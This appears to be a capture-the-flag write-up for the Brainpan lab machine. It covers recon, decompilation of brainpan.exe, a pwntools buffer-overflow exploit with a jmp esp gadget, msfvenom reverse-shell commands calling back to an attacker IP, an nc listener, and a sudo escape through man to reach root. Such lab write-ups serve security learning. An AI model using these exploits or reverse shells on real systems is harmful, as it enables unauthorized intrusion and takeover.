### IP


# Reconnaissance

### nmap

`nmap -sC -sV 10.10.192.29`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2022-12-28 02:43 EST
Nmap scan report for 10.10.192.29
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
9999/tcp  open  abyss?
| fingerprint-strings: 
|   NULL: 
|     _| _| 
|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
|     _|_| _| _| _| _| _| _| _| _| _| _| _|
|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|
|     [________________________ WELCOME TO BRAINPAN _________________________]
|_    ENTER THE PASSWORD
10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
|_http-server-header: SimpleHTTP/0.6 Python/2.7.3
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9999-TCP:V=7.80%I=7%D=12/28%Time=63ABF3C7%P=x86_64-pc-linux-gnu%r(N
SF:ULL,298,"_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\n_\|_\|_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|\x20\x20\x20\x20_\|_\|_\
SF:|\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20\x20_\|_\|_\|\x20\x20\x20
SF:\x20\x20\x20_\|_\|_\|\x20\x20_\|_\|_\|\x20\x20\n_\|\x20\x20\x20\x20_\|\
SF:x20\x20_\|_\|\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\
SF:x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|\x20\x20\x20\x20_\
SF:|\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\
SF:x20_\|\x20\x20\x20\x20_\|\x20\x20_\|\x20\x20\x20\x20_\|\n_\|_\|_\|\x20\
SF:x20\x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\|_\|_\|\x20\x20
SF:_\|\x20\x20_\|\x20\x20\x20\x20_\|\x20\x20_\|_\|_\|\x20\x20\x20\x20\x20\
SF:x20_\|_\|_\|\x20\x20_\|\x20\x20\x20\x20_\|\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20_\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20_\|\n\n\[________________________\x20WELCOME\x20TO\x20BRAINPAN\
SF:x20_________________________\]\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ENTER\
SF:x20THE\x20PASSWORD\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\n
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20>>\x20");
```
Port 9999 is hosting a service that asks for a password

Port 10000 is hosting a website running from SimpleHTTP/0.6 Python/2.7.3 that displays a security graphic

### gobuster

`gobuster dir -u http://10.10.192.29:10000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt -t 50`
```
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.192.29:10000/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Extensions:              html,txt
[+] Timeout:                 10s
===============================================================
2022/12/28 03:25:30 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 215]
/bin                  (Status: 301) [Size: 0] [--> /bin/]
===============================================================
2022/12/28 04:21:28 Finished
===============================================================
```
There is a `/bin` directory that gives us an executable named `brainpan.exe`

# Reverse Engineering

### Ghidra

We can analyze the binary in Ghidra and look at the decompilation for the main function

A very rough markup of the program can be seen here:

```c
int __cdecl _main(int _Argc,char **_Argv,char **_Env)

{
  int iVar1;
  size_t LENGTH_OF_USER_INPUT;
  size_t in_stack_fffff9f0;
  sockaddr SOCKET_ADDRESS;
  undefined local_5cc [4];
  undefined4 local_5c8;
  SOCKET SOCKET;
  SOCKET SOCKET_ID;
  WSADATA winSocketData;
  undefined4 local_414;
  undefined4 LISTENING_PORT;
  int SOCKET_ADDRESS_LENGTH;
  char *ACCESS_GRANTED_STRING;
  char *ACCESS_DENIED_STRING;
  char *USER_INPUT;
  char CLEARED_MEMORY [1016];
  
  __alloca(in_stack_fffff9f0);
  ___main();
  USER_INPUT = 
  "_|                            _|                                        \n_|_|_|    _|  _|_|    _ |_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  \n_|    _|  _|_|      _|    _|  _|  _|    _|  _|     _|  _|    _|  _|    _|\n_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _ |\n_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|\n                                             _|                          \n                                            _ |\n\n[________________________ WELCOME TO BRAINPAN _________________________]\n                           ENTER THE PASSWORD                              \n\n                          >> "
  ;
  ACCESS_DENIED_STRING = "                          ACCESS DENIED\n";
  ACCESS_GRANTED_STRING = "                          ACCESS GRANTED\n";
  LISTENING_PORT = 9999;
  local_414 = 1;
  _printf("[+] initializing winsock...");
                    /* 514 is the wVersionRequested for the winsock api */
  iVar1 = _WSAStartup@8(514,&winSocketData);
  if (iVar1 == 0) {
    _printf("done.\n");
    iVar1 = 1;
    SOCKET_ID = _socket@12(2,1,0);
    if (SOCKET_ID == 0xffffffff) {
      iVar1 = _WSAGetLastError@0();
      _printf("[!] could not create socket: %d",iVar1);
    }
    _printf("[+] server socket created.\n",iVar1);
    local_5cc._0_2_ = 2;
    local_5c8 = 0;
    local_5cc._2_2_ = _htons@4(9999);
    iVar1 = _bind@12(SOCKET_ID,(sockaddr *)local_5cc,0x10);
    if (iVar1 == -1) {
      iVar1 = _WSAGetLastError@0();
      _printf("[!] bind failed: %d",iVar1);
    }
    _printf("[+] bind done on port %d\n",LISTENING_PORT);
    _listen@8(SOCKET_ID,3);
    _printf("[+] waiting for connections.\n");
    SOCKET_ADDRESS_LENGTH = 0x10;
    while (SOCKET = _accept@12(SOCKET_ID,&SOCKET_ADDRESS,&SOCKET_ADDRESS_LENGTH),
          SOCKET != 0xffffffff) {
      _printf("[+] received connection.\n");
      _memset(CLEARED_MEMORY,0,1000);
      LENGTH_OF_USER_INPUT = _strlen(USER_INPUT);
      _send@16(SOCKET,USER_INPUT,LENGTH_OF_USER_INPUT,0);
      _recv@16(SOCKET,CLEARED_MEMORY,1000,0);
      local_414 = _get_reply(CLEARED_MEMORY);
      _printf("[+] check is %d\n",local_414);
      iVar1 = _get_reply(CLEARED_MEMORY);
      if (iVar1 == 0) {
        LENGTH_OF_USER_INPUT = _strlen(ACCESS_DENIED_STRING);
        _send@16(SOCKET,ACCESS_GRANTED_STRING,LENGTH_OF_USER_INPUT,0);
      }
      else {
        LENGTH_OF_USER_INPUT = _strlen(ACCESS_GRANTED_STRING);
        _send@16(SOCKET,ACCESS_DENIED_STRING,LENGTH_OF_USER_INPUT,0);
      }
      _closesocket@4(SOCKET);
    }
    iVar1 = _WSAGetLastError@0();
    _printf("[!] accept failed: %d",iVar1);
  }
  else {
    iVar1 = _WSAGetLastError@0();
    _printf("[!] winsock init failed: %d",iVar1);
  }
  return 1;
}
```

# Binary Exploitation

### Writing the exploit

There is a buffer overflow as a result of calling `_recv` with a 1000-byte input. 

I wrote a simple exploit using pwntools that connected to a version of the service that I ran locally using `wine64 brainpan.exe`

The binary provides an error message: `"Unhandled page fault on read access to <address> at address <address>"`

After fuzzing for a bit, I found that the offset of `524` allows us to control the read address:


```python3
#!/bin/python3

from pwn import *

context.log_level = 'debug'

r = remote('localhost', 9999)

offset = 524
payload = b'A'*offset
payload += p32(0xdeadbeef)

r.sendline(payload)

r.interactive()

```

This code provides the following error: `wine: Unhandled page fault on read access to DEADBEEF at address DEADBEEF (thread 002d), starting debugger...`


Running `winedbg brainpan.exe` shows more information

```
Wine-dbg>c
Unhandled exception: page fault on read access to 0xdeadbeef in 32-bit code (0x00000000deadbeef).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:deadbeef ESP:0042f870 EBP:41414141 EFLAGS:00010297(  R- --  I S -A-P-C)
 EAX:ffffffff EBX:3116f000 ECX:0042f660 EDX:ffffffff
 ESI:00000000 EDI:00000000
Stack dump:
0x000000000042f870:  0042fa900042000a 00000000000003e8
0x000000000042f880:  0000000000000000 0042f92000000000
0x000000000042f890:  0000000000000000 0000001000000000
0x000000000042f8a0:  000000007bcd1f50 0042f90800000000
0x000000000042f8b0:  0100007f5ea10002 0000000000000000
0x000000000042f8c0:  000000000f270002 00000000ffffffff
0x000000000042f8d0:  0042fa100042f8f0 0000002400000028
0x000000000042f8e0:  536e695702020202 00302e32206b636f
0x000000000042f8f0:  7bc5c4167fa14438 7bc5cbe50042f9f8
0x000000000042f900:  0042fb700042f920 7bc520ba0042fa78
0x000000000042f910:  0000000000000000 b4cb650000000000
0x000000000042f920:  000000020042f9a8 000000000042f968
Backtrace:
=>0 0x00000000deadbeef (0x0000000041414141)
0x00000000deadbeef: addb	%al,0x0(%eax)
Wine-dbg>

```

It is clear that we are controlling the instruction pointer.

Using a cargo package, [binary-security-check](https://github.com/koutheir/binary-security-check), we can see that it does not have DEP enabled:
`binary-security-check brainpan.exe`
```
brainpan.exe: +CHECKSUM !DATA-EXEC-PREVENT !RUNS-IN-APP-CONTAINER +CONSIDER-MANIFEST !VERI
```

This means we can get it to execute shellcode.

We can generate the shellcode using `msfvenom -p windows/shell_reverse_tcp LHOST=10.6.0.114 LPORT=4444 -f python -b='\x00'`

This gives us shellcode to be used in a python format that calls back to a meterpreter on port 4444 on our machine. 

Before we can jump to the shellcode, we need to find a ROP gadget to do so. Because we are writing to the stack, we want a gadget that does `jmp esp` to jump to the stack pointer.

We can find this gadget with `ROPgadget --binary brainpan.exe  | grep 'jmp esp'`, which gives us an address of `0x311712f3`

Thus, our payload looks like the following:

```python3
offset = 524
payload = b'A'*offset
payload += p32(0x311712f3)
payload += b'\x90'*32
payload += shellcode
```

Here, the instruction pointer is overwritten witht the address of `jmp esp`, which allows us to execute what is on the stack (our shellcode)

Here, `\x90` is the opcode for a `nop`, which is there to ensure that the shellcode runs properly.


### Connecting

To connect to the reverse shell, we have to set up a listener with `nc -lvnp 4444`

We can then run the python exploit and we should get a callback

# Local Reconnaissance

For some reason, `systeminfo` doesn't seem to work

Interestingly, it appears that we are on a linux file system. 

We can `c:` to get to the windows machine drive, but it doesn't look like a real windows filesystem.

Looking at the `checksrv.sh` file, the following line indicates that this is actually running the program through wine on with a bash script:
`	/usr/bin/wine /home/puck/web/bin/brainpan.exe &`

The new payload can be generated with `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.6.0.114 LPORT=4444 -f python -b='\x00'`


Running `uname -a` shows us the following:

```
Linux brainpan 3.5.0-25-generic #39-Ubuntu SMP Mon Feb 25 19:02:34 UTC 2013 i686 i686 i686 GNU/Linux
```

# Privilege Escalation

Running `sudo -l` shows us sudoer information:
```
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util

```

We can't read the util, but there is a `manual` function that appears to just add our command to the `man` command.

man allows for [command execution](https://gtfobins.github.io/gtfobins/man/), which means we can simply run `sudo /home/anansi/bin/anansi_util manual man` and then type in `:!/bin/bash`

We now are root

# Lessons Learned

The `linux/x86/shell_reverse_tcp` and `windows/shell_reverse_tcp` payloads
may work much better than
the `linux/x86/shell/reverse_tcp` and `windows/shell/reverse_tcp` payloads

Basically, try different payloads